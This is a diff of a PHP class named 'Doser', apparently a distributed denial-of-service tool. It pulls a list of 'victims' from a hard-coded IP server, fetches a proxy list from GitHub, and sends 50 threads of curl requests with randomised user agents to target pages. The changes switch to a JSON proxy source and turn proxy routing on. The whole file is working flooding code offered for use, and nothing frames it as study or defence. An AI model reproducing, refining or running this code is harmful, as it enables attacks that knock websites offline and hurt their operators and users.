@@ -2,8 +2,9 @@
 class Doser {
 
 	var $source='http://164.92.247.88:9300/victims'; //список сайтов в json
-	var $proxylist='https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt'; // список прокси с гитхаба
-	var $useProxy=false;
+	var $proxylist='https://raw.githubusercontent.com/opengs/uashieldtargets/v2/proxy.json';
+//https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt'; // список прокси с гитхаба
+	var $useProxy=true;
 	var $threads=50;
 	var $showResult=0;
 	var $pages;
@@ -38,8 +39,9 @@ class Doser {
 			$r=$this->get('dd_proxy',600);
 			if (!$r) {
 				try{ 
-					$l=file_get_contents($this->proxylist, false, stream_context_create($arrContextOptions));
-					$this->proxy=preg_split("/[\n\r]+/",trim($l));
+					$this->proxy=json_decode(file_get_contents($this->proxylist, false, stream_context_create($arrContextOptions)));
+//					$l=file_get_contents($this->proxylist, false, stream_context_create($arrContextOptions));
+//					$this->proxy=preg_split("/[\n\r]+/",trim($l));
 					$this->set('dd_proxy',$this->proxy);
 				} catch(Exception $e) {
 					$this->proxy=$this->get('dd_proxy',600,1);
@@ -63,14 +65,13 @@ class Doser {
 		for($i=0;$i<$this->threads;$i++) {
 			$rand=rand(0,$l-1);
 			$page=trim($this->pages[$rand]->url);
-
 			$userAgent = (new userAgent) ->generate();
 
 			$init = curl_init($page);
 			curl_setopt($init, CURLOPT_FOLLOWLOCATION, 1);
 			curl_setopt($init, CURLOPT_RETURNTRANSFER, 1);
 			if($proxLength)  {
-				$phost=$this->proxy[rand(0,$proxLength)];
+				$phost=$this->proxy[rand(0,$proxLength)]->ip;
 //				if(strstr($phost,'@')) {
 //					list($pwd,$phost)=explode('@',$phost);
 //				    curl_setopt($init, CURLOPT_PROXYUSERPWD, $phost->auth);
